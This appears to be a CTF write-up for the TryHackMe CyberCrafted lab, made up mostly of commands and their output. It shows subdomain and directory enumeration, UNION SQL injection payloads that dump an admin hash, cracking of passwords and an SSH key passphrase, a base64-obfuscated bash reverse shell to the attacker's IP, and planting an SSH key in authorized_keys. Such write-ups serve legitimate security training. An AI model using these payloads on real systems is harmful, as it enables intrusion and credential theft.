# TryHackMe-CyberCrafted

**Scope:**

- Screen
- SQL Injection

**Keywords:**

- Subdomain & Virtual Host Enumeration
- Directory Scan
- SQL Injection
- Password Cracking
- Passphrase Cracking for SSH Connection
- Log Analysis
- Screen Binary Escape

**Main Commands:**

- `nmap -sSVC -T4 -A -O -oN nmap_result.txt -Pn -p- --min-rate 1000 --max-retries 3 $target_ip`
- `ffuf -u 'PROTOCOL://cybercrafted.thm/' -H 'Host: HOST.cybercrafted.thm' -w <(echo -e "http\nhttps"):PROTOCOL -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:HOST -ic -mc 200,301,302,403 -t 70 -fs 0`
- `gobuster dir -u http://cybercrafted.thm/ -w /usr/share/wordlists/dirb/common.txt -e -x php,txt,html --random-agent -b 403,404,500,501,502,503 -t 20`
- `gobuster dir -u http://store.cybercrafted.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -e -x php,txt,html --random-agent -b 403,404,500,501,502,503 -t 20`
- `gobuster dir -u http://admin.cybercrafted.thm/ -w /usr/share/wordlists/dirb/common.txt -e -x php,txt,html --random-agent -b 403,404,500,501,502,503 -t 20`
- `curl --path-as-is -iskL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'search=%27+UNION+SELECT+1%2C2%2C3%2C4+--+-&submit=' $'http://store.cybercrafted.thm/search.php/'`
- `curl --path-as-is -iskL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'search=%27+UNION+SELECT+1%2C@@version%2C3%2C4+--+-&submit=' $'http://store.cybercrafted.thm/search.php/'`
- `curl --path-as-is -iskL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'search=%27+UNION+SELECT+1%2Cuser()%2C3%2C4+--+-&submit=' $'http://store.cybercrafted.thm/search.php/'`
- `curl --path-as-is -iskL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'search=%27+UNION+SELECT+1%2Cdatabase()%2C3%2C4+--+-&submit=' $'http://store.cybercrafted.thm/search.php/'`
- `curl --path-as-is -iskL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'search=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2Ctable_name+FROM+information_schema.tables+--+-&submit=' $'http://store.cybercrafted.thm/search.php/'`
- `curl --path-as-is -iskL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'search=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2Ccolumn_name+FROM+information_schema.columns+WHERE+table_name%3D%27admin%27+--+-&submit=' $'http://store.cybercrafted.thm/search.php/'`
- `curl --path-as-is -iskL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'search=%27+UNION+SELECT+NULL%2Cid%2Cuser%2Chash+FROM+admin+--+-&submit=' $'http://store.cybercrafted.thm/search.php/'`
- `sqlmap --random-agent -r sqlmapreq.txt --dump-all --batch -p 'search' -D webapp`
- `sudo john ultimatehash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1`
- `chmod 600 id_rsa_ulti`
- `ssh -i id_rsa_ulti xxultimatecreeperxx@cybercrafted.thm`
- `ssh2john id_rsa_ulti > hashidrsa`
- `sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashidrsa`
- `ssh root@cybercrafted.thm -p 22`

**System Commands:**

- `echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjIuMzcuMzcvMTEyMjIgMD4mMQo=' | base64 -d | bash`
- `echo 'ssh-rsa [REDACTED] - SECRET root@kali' >> .ssh/authorized_keys`
- `sudo -l`
- `find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;`
- `groups`
- `find /opt -type f -name "*.txt" 2>/dev/null`
- `find /opt -perm -4000 -type f -exec ls -al {} 2>/dev/null \;`
- `getcap -r / 2>/dev/null`
- `getent group minecraft`
- `SHELL=/bin/bash script -q /dev/null`
- `export TERM=xterm`

### Laboratory Environment

[CyberCrafted](https://tryhackme.com/r/room/cybercrafted)

### Penetration Approaches and Commands

> **Network Enumeration Phase**
> 

`nmap -sSVC -T4 -A -O -oN nmap_result.txt -Pn -p- --min-rate 1000 --max-retries 3 $target_ip`

```jsx
PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)
|   256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)
|_  256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (ED25519)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cybercrafted
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
```

`nano /etc/hosts`

```jsx
10.10.192.95 cybercrafted.thm
```

> **HTTP Port Check**
> 

`curl -iLX GET -D response.txt http://cybercrafted.thm`

```jsx
HTTP/1.1 200 OK
Date: Thu, 28 Nov 2024 11:38:36 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Sun, 12 Sep 2021 10:32:21 GMT
ETag: "340-5cbc9dd1b3eb0"
Accept-Ranges: bytes
Content-Length: 832
Vary: Accept-Encoding
Content-Type: text/html

    <div>
        <img src="assets/index.png">
    </div>
</body>
<!-- A Note to the developers: Just finished up adding other subdomains, now you can work on them! -->
</html>

```

![image.png](image.png)

> **Subdomain & Virtual Host Enumeration Phase**
> 

`ffuf -u 'PROTOCOL://cybercrafted.thm/' -H 'Host: HOST.cybercrafted.thm' -w <(echo -e "http\nhttps"):PROTOCOL -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:HOST -ic -mc 200,301,302,403 -t 70 -fs 0`

```jsx
[Status: 200, Size: 832, Words: 236, Lines: 35, Duration: 332ms]
    * HOST: www
    * PROTOCOL: http

[Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 335ms]
    * HOST: store
    * PROTOCOL: http

[Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 4719ms]
    * HOST: admin
    * PROTOCOL: http

[Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 410ms]
    * HOST: www.admin
    * PROTOCOL: http

[Status: 403, Size: 291, Words: 20, Lines: 10, Duration: 335ms]
    * HOST: www.store
    * PROTOCOL: http

```

`nano /etc/hosts`

```jsx
10.10.192.95 cybercrafted.thm store.cybercrafted.thm admin.cybercrafted.thm
```

> **Directory Scan & Endpoint Control Phase**
> 

`gobuster dir -u http://cybercrafted.thm/ -w /usr/share/wordlists/dirb/common.txt -e -x php,txt,html --random-agent -b 403,404,500,501,502,503 -t 20`

```jsx
http://cybercrafted.thm/assets               (Status: 301) [Size: 321] [--> http://cybercrafted.thm/assets/]
http://cybercrafted.thm/index.html           (Status: 200) [Size: 832]
http://cybercrafted.thm/secret               (Status: 301) [Size: 321] [--> http://cybercrafted.thm/secret/]

```

`gobuster dir -u http://admin.cybercrafted.thm/ -w /usr/share/wordlists/dirb/common.txt -e -x php,txt,html --random-agent -b 403,404,500,501,502,503 -t 20`

```jsx
http://admin.cybercrafted.thm/assets               (Status: 301) [Size: 333] [--> http://admin.cybercrafted.thm/assets/]
http://admin.cybercrafted.thm/index.php            (Status: 200) [Size: 937]
http://admin.cybercrafted.thm/login.php            (Status: 302) [Size: 0] [--> /]
http://admin.cybercrafted.thm/panel.php            (Status: 302) [Size: 0] [--> /]
```

`gobuster dir -u http://store.cybercrafted.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -e -x php,txt,html --random-agent -b 403,404,500,501,502,503 -t 20`

```jsx
http://store.cybercrafted.thm/search.php           (Status: 200) [Size: 838]
http://store.cybercrafted.thm/assets               (Status: 301) [Size: 333] [--> http://store.cybercrafted.thm/assets/]

```

`curl -iLX GET -D response.txt http://cybercrafted.thm/secret/`

```jsx
HTTP/1.1 200 OK
Date: Thu, 28 Nov 2024 12:00:15 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1369
Content-Type: text/html;charset=UTF-8

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /secret</title>
 </head>
 <body>
<h1>Index of /secret</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="background-1.jpg">background-1.jpg</a></td><td align="right">2021-06-21 20:16  </td><td align="right">123K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="herobrine-3.jpeg">herobrine-3.jpeg</a></td><td align="right">2021-06-21 20:30  </td><td align="right"> 36K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="pack-2.png">pack-2.png</a></td><td align="right">2021-06-21 20:21  </td><td align="right"> 27K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.29 (Ubuntu) Server at cybercrafted.thm Port 80</address>
</body></html>

```

`curl -iLX GET -D adminpanelresponse.txt http://admin.cybercrafted.thm/panel.php/`

```jsx
HTTP/1.1 302 Found
Date: Thu, 28 Nov 2024 12:01:10 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=5gmad4gegtuugfq29v86uoaa6k; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /
Content-Length: 0
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Thu, 28 Nov 2024 12:01:10 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 937
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In</title>
    <link rel="stylesheet" href="assets/login.css">
    <link rel="shortcut icon" type="image/png" href="assets/logo.png">
</head>
<body>
    <div>
        <h1>admin login</h1>
    </div>
    <div class="login">
        <form action="login.php" method="post">
            <h2>Login</h2>
            <div class="textbox">
                <input type="text" placeholder="Username" name="uname">
            </div>
            <div class="textbox">
                <input type="password" placeholder="Password" name="pwd">
            </div>
            <input class="button" type="submit" name="" value="Sign in">
        </form>
    </div>
    <div>
        <img src="assets/logo.png">
    </div>
</body>
</html> 
```

`curl -iLX GET -D storesearchresponse.txt http://store.cybercrafted.thm/search.php/`

```jsx
HTTP/1.1 200 OK
Date: Thu, 28 Nov 2024 12:02:06 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 838
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Search</title>
    <link rel="stylesheet" href="assets/styles.css">
    <link rel="shortcut icon" type="image/png" href="assets/logo.png">
</head>
<body>
    <div class="title">
        <h1>store search</h1>
        <h3>Browse the store to purchase in-game items</h3>
    </div>
    <div class="form">
        <form action='' method='post'>
            <input type="text" placeholder="Search.." name="search">
            <button type="submit" name="submit"><img src="assets/search.png"></button>
        </form>
    </div>
    <div class="output">
        <div class="table">
                </div>
    </div>
</body>
</html>

```

> **SQL Injection Phase**
> 

![image.png](image%201.png)

**PAYLOAD:**

```jsx
' UNION SELECT 1,2,3,4 -- -
```

![image.png](image%202.png)

`curl --path-as-is -iskL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'search=%27+UNION+SELECT+1%2C2%2C3%2C4+--+-&submit=' $'http://store.cybercrafted.thm/search.php/'`

```jsx
[REDACTED] - MORE

                    <td>16x</td>
                    <td>1$</td>
                </tr>
                <tr>
                    <td>2</td>
                    <td>3</td>
                    <td>4</td>
                </tr>
          </table>
        </div>
    </div>
</body>
</html>

```

`curl --path-as-is -iskL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'search=%27+UNION+SELECT+1%2C@@version%2C3%2C4+--+-&submit=' $'http://store.cybercrafted.thm/search.php/'`

```jsx
[REDACTED] - MORE
                </tr>
                <tr>
                    <td>5.7.35-0ubuntu0.18.04.1</td>
                    <td>3</td>
                    <td>4</td>
                </tr>
          </table>
        </div>
    </div>
</body>
</html>

```

`curl --path-as-is -iskL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'search=%27+UNION+SELECT+1%2Cuser()%2C3%2C4+--+-&submit=' $'http://store.cybercrafted.thm/search.php/'`

```jsx
[REDACTED] - MORE
                    <td>root@localhost</td>
                    <td>3</td>
                    <td>4</td>
                </tr>
          </table>
        </div>
    </div>
</body>
</html>

```

`curl --path-as-is -iskL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'search=%27+UNION+SELECT+1%2Cdatabase()%2C3%2C4+--+-&submit=' $'http://store.cybercrafted.thm/search.php/'`

```jsx
[REDACTED] - MORE
                    <td>webapp</td>
                    <td>3</td>
                    <td>4</td>
                </tr>
          </table>
        </div>
    </div>
</body>
</html>

```

`curl --path-as-is -iskL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'search=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2Ctable_name+FROM+information_schema.tables+--+-&submit=' $'http://store.cybercrafted.thm/search.php/'`

```jsx
[REDACTED] - MORE

                <tr>
                    <td></td>
                    <td></td>
                    <td>table_lock_waits_summary_by_table</td>
                </tr>
                <tr>
                    <td></td>
                    <td></td>
                    <td>threads</td>
                </tr>
                <tr>
                    <td></td>
                    <td></td>
                    <td>user_variables_by_thread</td>
                </tr>
                <tr>
                    <td></td>
                    <td></td>
                    <td>users</td>
                    
                    <td></td>
                    <td></td>
                    <td>admin</td>
[REDACTED] - MORE
```

`curl --path-as-is -iskL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'search=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2Ccolumn_name+FROM+information_schema.columns+WHERE+table_name%3D%27admin%27+--+-&submit=' $'http://store.cybercrafted.thm/search.php/'`

```jsx
[REDACTED] - MORE

                    <td></td>
                    <td></td>
                    <td>id</td>
                </tr>
                <tr>
                    <td></td>
                    <td></td>
                    <td>user</td>
                </tr>
                <tr>
                    <td></td>
                    <td></td>
                    <td>hash</td>
                </tr>
          </table>
        </div>
    </div>
</body>
</html>

```

`curl --path-as-is -iskL -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'search=%27+UNION+SELECT+NULL%2Cid%2Cuser%2Chash+FROM+admin+--+-&submit=' $'http://store.cybercrafted.thm/search.php/'`

```jsx
[REDACTED] - MORE
                <tr>
                    <td>1</td>
                    <td>xXUltimateCreeperXx</td>
                    <td>88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01</td>
                </tr>
                <tr>
                    <td>4</td>
                    <td>web_flag</td>
                    <td>THM{bbe315906038c3a62d9b195001f75008}</td>
                </tr>
          </table>
        </div>
    </div>
</body>
</html>

```

![image.png](image%203.png)

`sqlmap --random-agent -r sqlmapreq.txt --dump-all --batch -p 'search' -D webapp`

```jsx
[2 entries]
+----+------------------------------------------+---------------------+
| id | hash                                     | user                |
+----+------------------------------------------+---------------------+
| 1  | 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01 | xXUltimateCreeperXx |
| 4  | THM{bbe315906038c3a62d9b195001f75008}    | web_flag            |
+----+------------------------------------------+---------------------+
```

> **Password Cracking Phase**
> 

`echo '88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01' > ultimatehash`

`sudo john ultimatehash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1`

```jsx
diamond123456789 (?)
```

> **Internal System Access Phase**
> 

![image.png](image%204.png)

![image.png](image%205.png)

> **Reverse Shell Phase**
> 

`nano reverse.txt`

```jsx
/bin/bash -i >& /dev/tcp/10.2.37.37/11222 0>&1
```

`cat reverse.txt | base64`

```jsx
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjIuMzcuMzcvMTEyMjIgMD4mMQo=
```

`nc -nlvp 11222`

```jsx
listening on [any] 11222 ...
```

![image.png](image%206.png)

**PAYLOAD:**

```jsx
echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjIuMzcuMzcvMTEyMjIgMD4mMQo=' | base64 -d | bash
```

```jsx
listening on [any] 11222 ...
connect to [10.2.37.37] from (UNKNOWN) [10.10.192.95] 33174
bash: cannot set terminal process group (1122): Inappropriate ioctl for device
bash: no job control in this shell

www-data@cybercrafted:/var/www/admin$ whoami
www-data
www-data@cybercrafted:/var/www/admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@cybercrafted:/var/www/admin$ pwd
/var/www/admin
www-data@cybercrafted:/var/www/admin$ SHELL=/bin/bash script -q /dev/null
www-data@cybercrafted:/var/www/admin$ export TERM=xterm

www-data@cybercrafted:/var/www/admin$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
xxultimatecreeperxx:x:1001:1001:,,,:/home/xxultimatecreeperxx:/bin/bash
cybercrafted:x:1002:1002:,,,:/home/cybercrafted:/bin/bash

www-data@cybercrafted:/var/www/admin$ ls -lsa /home
total 16
4 drwxr-xr-x  4 root                root                4096 Jun 27  2021 .
4 drwxr-xr-x 24 root                root                4096 Sep 30  2021 ..
4 drwxr-x---  4 cybercrafted        cybercrafted        4096 Sep 12  2021 cybercrafted
4 drwxr-xr-x  5 xxultimatecreeperxx xxultimatecreeperxx 4096 Oct 15  2021 xxultimatecreeperxx

www-data@cybercrafted:/var/www/admin$ 
```

> **Passphrase Cracking & SSH Connection Phase**
> 

```jsx
www-data@cybercrafted:/var/www/admin$ cd /home/xxultimatecreeperxx
cd /home/xxultimatecreeperxx
www-data@cybercrafted:/home/xxultimatecreeperxx$ ls -lsa

total 32
4 drwxr-xr-x 5 xxultimatecreeperxx xxultimatecreeperxx 4096 Oct 15  2021 .
4 drwxr-xr-x 4 root                root                4096 Jun 27  2021 ..
0 lrwxrwxrwx 1 root                root                   9 Sep 12  2021 .bash_history -> /dev/null
4 -rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx  220 Jun 27  2021 .bash_logout
4 -rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 3771 Jun 27  2021 .bashrc
4 drwx------ 2 xxultimatecreeperxx xxultimatecreeperxx 4096 Jun 27  2021 .cache
4 drwx------ 3 xxultimatecreeperxx xxultimatecreeperxx 4096 Jun 27  2021 .gnupg
0 -rw-rw-r-- 1 xxultimatecreeperxx xxultimatecreeperxx    0 Jun 27  2021 .hushlogin
4 -rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx  807 Jun 27  2021 .profile
4 drwxrwxr-x 2 xxultimatecreeperxx xxultimatecreeperxx 4096 Jun 27  2021 .ssh
0 lrwxrwxrwx 1 root                root                   9 Oct 15  2021 .viminfo -> /dev/null

www-data@cybercrafted:/home/xxultimatecreeperxx$ ls -lsa .ssh

total 16
4 drwxrwxr-x 2 xxultimatecreeperxx xxultimatecreeperxx 4096 Jun 27  2021 .
4 drwxr-xr-x 5 xxultimatecreeperxx xxultimatecreeperxx 4096 Oct 15  2021 ..
4 -rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx  414 Jun 27  2021 authorized_keys
4 -rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 1766 Jun 27  2021 id_rsa

www-data@cybercrafted:/home/xxultimatecreeperxx$ cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6

Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
SCc7TmWJgI/Bt6k9J60WNThmjKdYTuaLymOVJjiajho799BnAQWE89jOLwE3VA5m
SfcytNIJkHHQR67K2z2f0noCh2jVkM0sx8QS+hUBeNWT6lr3pEoBKPk5BkRgbpAu
lSkN+Ubrq2/+DA1e/LB9u9unwi+zUec1G5utqfmNPIHYyB2ZHWpX8Deyq5imWwH9
FkqfnN3JpXIW22TOMPYOOKAjan3XpilhOGhbZf5TUz0StZmQfozp5WOU/J5qBTtQ
sXG4ySXCWGEq5Mtj2wjdmOBIjbmVURWklbsN+R6UiYeBE5IViA9sQTPXcYnfDNPm
stB2ukMrnmINOu0U2rrHFqOwNKELmzSr7UmdxiHCWHNOSzH4jYl0zjWI7NZoTLNA
eE214PUmIhiCkNWgcymwhJ5pTq5tUg3OUeq6sSDbvU8hCE6jjq5+zYlqs+DkIW2v
VeaVnbA2hij69kGQi/ABtS9PrvRDj/oSIO4YMyZIhvnH+miCjNUNxVuH1k3LlD/6
LkvugR2wXG2RVdGNIwrhtkz8b5xaUvLY4An/rgJpn8gYDjIJj66uKQs5isdzHSlf
jOjh5qkRyKYFfPegK32iDfeD3F314L3KBaAlSktPKpQ+ooqUtTa+Mngh3CL8JpOO
Hi6qk24cpDUx68sSt7wIzdSwyYW4A/h0vxnZSsU6kFAqR28/6pjThHoQ0ijdKgpO
8wj/u29pyQypilQoWO52Kis4IzuMN6Od+R8L4RnCV3bBR4ppDAnW3ADP312FajR+
DQAHHtfpQJYH92ohpj3dF5mJTT+aL8MfAhSUF12Mnn9d9MEuGRKIwHWF4d1K69lr
0GpRSOxDrAafNnfZoykOPRjZsswK3YXwFu3xWQFl3mZ7N+6yDOSTpJgJuNfiJ0jh
MBMMh4+r7McEOhl4f4jd0PHPf3TdxaONzHtAoj69JYDIrxwJ28DtVuyk89pu2bY7
mpbcQFcsYHXv6Evh/evkSGsorcKHv1Uj3BCchL6V4mZmeJfnde6EkINNwRW8vDY+
gIYqA/r2QbKOdLyHD+xP4SpX7VVFliXXW9DDqdfLJ6glMNNNbM1mEzHBMywd1IKE
Zm+7ih+q4s0RBClsV0IQnzCrSij//4urAN5ZaEHf0k695fYAKMs41/bQ/Tv7kvNc
T93QJjphRwSKdyQIuuDsjCAoB7VuMI4hCrEauTavXU82lmo1cALeNSgvvhxxcd7r
1egiyyvHzUtOUP3RcOaxvHwYGQxGy1kq88oUaE7JrV2iSHBQTy6NkCV9j2RlsGZY
fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
-----END RSA PRIVATE KEY-----

www-data@cybercrafted:/home/xxultimatecreeperxx$ 
```

`nano id_rsa_ulti`

```jsx
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6

Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
SCc7TmWJgI/Bt6k9J60WNThmjKdYTuaLymOVJjiajho799BnAQWE89jOLwE3VA5m
SfcytNIJkHHQR67K2z2f0noCh2jVkM0sx8QS+hUBeNWT6lr3pEoBKPk5BkRgbpAu
lSkN+Ubrq2/+DA1e/LB9u9unwi+zUec1G5utqfmNPIHYyB2ZHWpX8Deyq5imWwH9
FkqfnN3JpXIW22TOMPYOOKAjan3XpilhOGhbZf5TUz0StZmQfozp5WOU/J5qBTtQ
sXG4ySXCWGEq5Mtj2wjdmOBIjbmVURWklbsN+R6UiYeBE5IViA9sQTPXcYnfDNPm
stB2ukMrnmINOu0U2rrHFqOwNKELmzSr7UmdxiHCWHNOSzH4jYl0zjWI7NZoTLNA
eE214PUmIhiCkNWgcymwhJ5pTq5tUg3OUeq6sSDbvU8hCE6jjq5+zYlqs+DkIW2v
VeaVnbA2hij69kGQi/ABtS9PrvRDj/oSIO4YMyZIhvnH+miCjNUNxVuH1k3LlD/6
LkvugR2wXG2RVdGNIwrhtkz8b5xaUvLY4An/rgJpn8gYDjIJj66uKQs5isdzHSlf
jOjh5qkRyKYFfPegK32iDfeD3F314L3KBaAlSktPKpQ+ooqUtTa+Mngh3CL8JpOO
Hi6qk24cpDUx68sSt7wIzdSwyYW4A/h0vxnZSsU6kFAqR28/6pjThHoQ0ijdKgpO
8wj/u29pyQypilQoWO52Kis4IzuMN6Od+R8L4RnCV3bBR4ppDAnW3ADP312FajR+
DQAHHtfpQJYH92ohpj3dF5mJTT+aL8MfAhSUF12Mnn9d9MEuGRKIwHWF4d1K69lr
0GpRSOxDrAafNnfZoykOPRjZsswK3YXwFu3xWQFl3mZ7N+6yDOSTpJgJuNfiJ0jh
MBMMh4+r7McEOhl4f4jd0PHPf3TdxaONzHtAoj69JYDIrxwJ28DtVuyk89pu2bY7
mpbcQFcsYHXv6Evh/evkSGsorcKHv1Uj3BCchL6V4mZmeJfnde6EkINNwRW8vDY+
gIYqA/r2QbKOdLyHD+xP4SpX7VVFliXXW9DDqdfLJ6glMNNNbM1mEzHBMywd1IKE
Zm+7ih+q4s0RBClsV0IQnzCrSij//4urAN5ZaEHf0k695fYAKMs41/bQ/Tv7kvNc
T93QJjphRwSKdyQIuuDsjCAoB7VuMI4hCrEauTavXU82lmo1cALeNSgvvhxxcd7r
1egiyyvHzUtOUP3RcOaxvHwYGQxGy1kq88oUaE7JrV2iSHBQTy6NkCV9j2RlsGZY
fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
-----END RSA PRIVATE KEY-----
```

`chmod 600 id_rsa_ulti`

`ssh -i id_rsa_ulti xxultimatecreeperxx@cybercrafted.thm`

```jsx
Enter passphrase for key 'id_rsa_ulti': 
```

`ssh2john id_rsa_ulti > hashidrsa`

`sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashidrsa`

```jsx
creepin2006      (id_rsa_ulti) 
```

`ssh -i id_rsa_ulti xxultimatecreeperxx@cybercrafted.thm`

```jsx
Enter passphrase for key 'id_rsa_ulti': creepin2006

xxultimatecreeperxx@cybercrafted:~$ whoami
xxultimatecreeperxx
xxultimatecreeperxx@cybercrafted:~$ id
uid=1001(xxultimatecreeperxx) gid=1001(xxultimatecreeperxx) groups=1001(xxultimatecreeperxx),25565(minecraft)
xxultimatecreeperxx@cybercrafted:~$ pwd
/home/xxultimatecreeperxx

xxultimatecreeperxx@cybercrafted:~$ groups
xxultimatecreeperxx minecraft
xxultimatecreeperxx@cybercrafted:~$ getent group minecraft
minecraft:x:25565:xxultimatecreeperxx

xxultimatecreeperxx@cybercrafted:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
xxultimatecreeperxx@cybercrafted:~$ find / -type f -perm -u=s 2>/dev/null

/bin/su
/bin/fusermount
/bin/mount
/bin/umount
/bin/ping
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/at
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1

xxultimatecreeperxx@cybercrafted:~$ find /opt -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
xxultimatecreeperxx@cybercrafted:~$ 

```

> **Log Analysis & Switch User Phase**
> 

```jsx
xxultimatecreeperxx@cybercrafted:~$ find /opt -type f -name "*.txt" 2>/dev/null

/opt/minecraft/note.txt
/opt/minecraft/minecraft_server_flag.txt
/opt/minecraft/cybercrafted/white-list.txt
/opt/minecraft/cybercrafted/plugins/LoginSystem/log.txt
/opt/minecraft/cybercrafted/ops.txt
/opt/minecraft/cybercrafted/banned-ips.txt
/opt/minecraft/cybercrafted/banned-players.txt

xxultimatecreeperxx@cybercrafted:~$ cat /opt/minecraft/note.txt
Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
- cybercrafted

P.S
